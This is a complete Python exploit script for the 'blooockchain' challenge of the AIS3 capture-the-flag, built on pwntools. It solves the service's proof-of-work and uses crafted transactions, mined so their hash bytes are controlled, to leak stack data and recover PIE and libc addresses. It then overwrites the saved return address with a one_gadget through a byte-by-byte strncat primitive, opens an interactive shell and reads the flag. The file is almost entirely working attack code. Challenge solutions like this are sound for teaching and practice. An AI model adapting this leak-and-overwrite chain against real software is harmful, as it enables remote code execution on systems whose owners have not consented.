#!/usr/bin/env python3
# AIS3 blooockchain exploit
# Usage:
#   python3 blooock_solve.py remote chals1.ais3.org 21337
#   python3 blooock_solve.py local ./chal ./libc.so.6

from pwn import *
try:
    from pwnlib.exception import PwnlibException
except Exception:
    PwnlibException = Exception
import hashlib
import re
import sys
from datetime import datetime, timezone

context.arch = "amd64"
context.log_level = "info"

RET_TO_MAIN_OFF = 0x185b
LIBC_RET_OFF    = 0x2a578
ONE_GADGET_OFF  = 0x5bdb6

FROM = "a"
TO   = "b"

# These first 16 messages all have SHA256 digests with no NUL bytes.
# They fill exactly 0x200 bytes before we start overwriting saved frame data.
FILL_MONEY = [format(i, "x") for i in range(16)]
EMPTY_MONEY = "2ef"   # sha256("From: a, To: b, Money: 2ef")[0] == 0

_byte_cache = {}

def sha_money(money: str) -> bytes:
    msg = f"From: {FROM}, To: {TO}, Money: {money}".encode()
    return hashlib.sha256(msg).digest()

def leading_zero_bits(digest: bytes) -> int:
    total = 0
    for byte in digest:
        if byte == 0:
            total += 8
            continue
        for shift in range(7, -1, -1):
            if byte & (1 << shift):
                return total
            total += 1
    return total

def hashcash(bits: int, resource: str) -> str:
    date = datetime.now(timezone.utc).strftime("%y%m%d%H%M%S")
    counter = 0
    while True:
        stamp = f"1:{bits}:{date}:{resource}::python:{counter:x}"
        if leading_zero_bits(hashlib.sha1(stamp.encode()).digest()) >= bits:
            return stamp
        counter += 1

def handle_pow(io):
    """Accepts the common hashcash PoW wrapper used by the challenge infra."""
    buf = io.recvrepeat(1.0)
    if b"Enter your choice:" in buf:
        return buf

    # Try to collect a fuller PoW banner if the first read was partial.
    if not buf or (b"hashcash" not in buf and b"pow_solver" not in buf and b"resource" not in buf.lower()):
        buf += io.recvrepeat(1.0)

    if b"Enter your choice:" in buf:
        return buf

    log.info("initial banner / PoW:\n%s", buf.decode(errors="replace"))

    patterns = [
        rb"pow_solver\.py\s+(\d+)\s+([^\s]+)",
        rb"hashcash\s+-mb\s*(\d+)\s+([^\s]+)",
        rb"bits\s*[:=]\s*(\d+).*?resource\s*[:=]\s*([^\s]+)",
    ]
    m = None
    for pat in patterns:
        m = re.search(pat, buf, re.I | re.S)
        if m:
            break
    if not m:
        # No PoW wrapper, or unknown format. Continue directly and let recvuntil fail clearly.
        return buf + io.recvuntil(b"Enter your choice: ")

    bits = int(m.group(1))
    resource = m.group(2).decode(errors="replace").strip("'\".,:;()[]{}")
    log.info("solving PoW: bits=%d resource=%s", bits, resource)
    stamp = hashcash(bits, resource)
    io.sendline(stamp.encode())
    return buf + io.recvuntil(b"Enter your choice: ")

def mine_byte(byte: int) -> str:
    """Find money such that digest starts with [byte, 0x00].
    strncat appends exactly one controlled byte, then writes its own NUL terminator.
    """
    if byte == 0:
        raise ValueError("cannot append a NUL byte with this strncat primitive")
    if byte in _byte_cache:
        return _byte_cache[byte]

    m = 0
    while True:
        money = format(m, "x")
        d = sha_money(money)
        if d[0] == byte and d[1] == 0:
            _byte_cache[byte] = money
            log.info("mined byte %#04x -> money=%s", byte, money)
            return money
        m += 1

def add_tx(io, money: str):
    # The menu prompt has already been consumed, so send the choice directly.
    io.sendline(b"1")
    io.recvuntil(b"Enter From account: ")
    io.sendline(FROM.encode())
    io.recvuntil(b"Enter To account: ")
    io.sendline(TO.encode())
    io.recvuntil(b"Enter Money amount: ")
    io.sendline(money.encode())
    io.recvuntil(b"Enter your choice: ")

def view_chain(io) -> bytes:
    io.sendline(b"2")
    out = io.recvuntil(b"Enter your choice: ")
    hex_lines = []
    for line in out.splitlines():
        line = line.strip()
        if re.fullmatch(rb"[0-9a-f]{64}", line):
            hex_lines.append(line)
    return bytes.fromhex(b"".join(hex_lines).decode())

def exploit_once(io) -> bool:
    handle_pow(io)

    # 18 empty records: counter grows, but the stack buffer remains an empty C string.
    # Then option 2 prints counter*32 bytes and leaks past the 0x200 stack buffer.
    for _ in range(18):
        add_tx(io, EMPTY_MONEY)

    leak = view_chain(io)
    if len(leak) < 544:
        log.failure("leak too short: %d bytes", len(leak))
        return False

    pie_ret  = u64(leak[520:528])
    libc_ret = u64(leak[536:544])
    pie_base = pie_ret - RET_TO_MAIN_OFF
    libc_base = libc_ret - LIBC_RET_OFF
    one = libc_base + ONE_GADGET_OFF

    log.success("PIE base  = %#x", pie_base)
    log.success("libc base = %#x", libc_base)
    log.success("one_gadget= %#x", one)

    one_bytes = p64(one)[:6]
    if b"\x00" in one_bytes:
        log.warning("one_gadget low 6 bytes contain NUL: %s; reconnect and retry", one_bytes.hex())
        return False

    # Fill exactly 0x200 bytes with hash chunks that contain no NUL bytes.
    for money in FILL_MONEY:
        # sanity check; remove this if you want absolute speed
        assert b"\x00" not in sha_money(money)
        add_tx(io, money)

    # saved rbp: any 8 nonzero bytes are enough. leave;ret consumes it, but the ret slot follows.
    for _ in range(8):
        add_tx(io, mine_byte(0x41))

    # saved rip: write the low 6 nonzero bytes of libc_base+0x5bdb6.
    # The terminating NUL written by strncat becomes address byte 6, and byte 7 was already 0.
    for b in one_bytes:
        add_tx(io, mine_byte(b))

    io.sendline(b"3")
    return True

def main():
    if len(sys.argv) < 2 or sys.argv[1] not in {"remote", "local"}:
        print("Usage:")
        print("  python3 blooock_solve.py remote chals1.ais3.org 21337")
        print("  python3 blooock_solve.py local ./chal ./libc.so.6")
        return 1

    for attempt in range(1, 10):
        log.info("attempt %d", attempt)
        if sys.argv[1] == "remote":
            host = sys.argv[2] if len(sys.argv) > 2 else "chals1.ais3.org"
            port = int(sys.argv[3]) if len(sys.argv) > 3 else 21337
            io = remote(host, port)
        else:
            chal = sys.argv[2] if len(sys.argv) > 2 else "./chal"
            libc_dir = "."
            if len(sys.argv) > 3:
                import os
                libc_dir = os.path.dirname(os.path.abspath(sys.argv[3])) or "."
            io = process(["/lib64/ld-linux-x86-64.so.2", "--library-path", libc_dir, chal])

        try:
            if not exploit_once(io):
                io.close()
                continue
            io.sendline(b"cat /flag* 2>/dev/null; cat flag* 2>/dev/null; id")
            io.interactive()
            return 0
        except (EOFError, PwnlibException, TimeoutError) as e:
            log.warning("failed: %r", e)
            try:
                io.close()
            except Exception:
                pass
            continue

    log.failure("all attempts failed")
    return 1

if __name__ == "__main__":
    raise SystemExit(main())
